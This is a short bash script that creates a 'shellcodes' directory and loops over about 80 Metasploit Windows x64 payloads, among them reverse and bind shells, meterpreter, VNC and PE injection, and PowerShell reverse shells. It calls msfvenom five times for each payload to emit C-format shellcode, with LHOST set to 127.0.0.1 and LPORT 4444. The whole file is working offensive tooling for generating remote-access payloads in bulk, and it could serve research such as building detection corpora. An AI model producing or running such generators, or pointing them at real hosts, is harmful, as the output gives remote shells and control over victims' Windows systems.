#!/bin/bash

# Directory to store the generated shellcodes
mkdir -p shellcodes
cd shellcodes

# Array of payloads
payloads=(
    "windows/x64/shell_reverse_tcp"
  "windows/x64/shell_bind_tcp"
  "windows/x64/meterpreter_reverse_tcp"
  "windows/x64/meterpreter_bind_tcp"
  "windows/x64/exec"
  "windows/x64/dllinject/reverse_tcp"
  "windows/x64/custom/bind_ipv6_tcp"
  "windows/x64/custom/bind_ipv6_tcp_uuid"
  "windows/x64/custom/bind_named_pipe"
  "windows/x64/custom/bind_tcp"
  "windows/x64/custom/bind_tcp_rc4"
  "windows/x64/custom/bind_tcp_uuid"
  "windows/x64/custom/reverse_http"
  "windows/x64/custom/reverse_https"
  "windows/x64/custom/reverse_named_pipe"
  "windows/x64/custom/reverse_tcp"
  "windows/x64/custom/reverse_tcp_rc4"
  "windows/x64/custom/reverse_tcp_uuid"
  "windows/x64/custom/reverse_winhttp"
  "windows/x64/custom/reverse_winhttps"
  "windows/x64/encrypted_shell/reverse_tcp"
  "windows/x64/loadlibrary"
  "windows/x64/messagebox"
  "windows/x64/meterpreter/bind_ipv6_tcp"
  "windows/x64/meterpreter/bind_ipv6_tcp_uuid"
  "windows/x64/meterpreter/bind_named_pipe"
  "windows/x64/meterpreter/bind_tcp"
  "windows/x64/meterpreter/bind_tcp_rc4"
  "windows/x64/meterpreter/bind_tcp_uuid"
  "windows/x64/meterpreter/reverse_http"
  "windows/x64/meterpreter/reverse_https"
  "windows/x64/meterpreter/reverse_named_pipe"
  "windows/x64/meterpreter/reverse_tcp"
  "windows/x64/meterpreter/reverse_tcp_rc4"
  "windows/x64/meterpreter/reverse_tcp_uuid"
  "windows/x64/meterpreter/reverse_winhttp"
  "windows/x64/meterpreter/reverse_winhttps"
  "windows/x64/meterpreter_bind_named_pipe"
  "windows/x64/meterpreter_bind_tcp"
  "windows/x64/meterpreter_reverse_http"
  "windows/x64/meterpreter_reverse_https"
  "windows/x64/meterpreter_reverse_ipv6_tcp"
  "windows/x64/meterpreter_reverse_tcp"
  "windows/x64/peinject/bind_ipv6_tcp"
  "windows/x64/peinject/bind_ipv6_tcp_uuid"
  "windows/x64/peinject/bind_named_pipe"
  "windows/x64/peinject/bind_tcp"
  "windows/x64/peinject/bind_tcp_rc4"
  "windows/x64/peinject/bind_tcp_uuid"
  "windows/x64/peinject/reverse_named_pipe"
  "windows/x64/peinject/reverse_tcp"
  "windows/x64/peinject/reverse_tcp_rc4"
  "windows/x64/peinject/reverse_tcp_uuid"
  "windows/x64/pingback_reverse_tcp"
  "windows/x64/powershell_bind_tcp"
  "windows/x64/powershell_reverse_tcp"
  "windows/x64/powershell_reverse_tcp_ssl"
  "windows/x64/shell/bind_ipv6_tcp"
  "windows/x64/shell/bind_ipv6_tcp_uuid"
  "windows/x64/shell/bind_named_pipe"
  "windows/x64/shell/bind_tcp"
  "windows/x64/shell/bind_tcp_rc4"
  "windows/x64/shell/bind_tcp_uuid"
  "windows/x64/shell/reverse_tcp"
  "windows/x64/shell/reverse_tcp_rc4"
  "windows/x64/shell/reverse_tcp_uuid"
  "windows/x64/shell_bind_tcp"
  "windows/x64/shell_reverse_tcp"
  "windows/x64/vncinject/bind_ipv6_tcp"
  "windows/x64/vncinject/bind_ipv6_tcp_uuid"
  "windows/x64/vncinject/bind_named_pipe"
  "windows/x64/vncinject/bind_tcp"
  "windows/x64/vncinject/bind_tcp_rc4"
  "windows/x64/vncinject/bind_tcp_uuid"
  "windows/x64/vncinject/reverse_http"
  "windows/x64/vncinject/reverse_https"
  "windows/x64/vncinject/reverse_tcp"
  "windows/x64/vncinject/reverse_tcp_rc4"
  "windows/x64/vncinject/reverse_tcp_uuid"
  "windows/x64/vncinject/reverse_winhttp"
  "windows/x64/vncinject/reverse_winhttps"
  # Add more payloads as needed
)

# LHOST and LPORT for reverse shells
LHOST="127.0.0.1"
LPORT="4444"

# Loop through each payload and generate shellcodes
for payload in "${payloads[@]}"; do
  for ((i=1; i<=5; i++)); do  # Generate multiple variations for each payload
    output_file="${payload//\//_}_$i.c"
    echo "Generating shellcode for $payload (variation $i)..."
    msfvenom -p $payload LHOST=$LHOST LPORT=$LPORT --platform windows -a x64 -f c -o $output_file

  done
done

echo "Shellcode generation complete. Check the shellcodes/ directory."

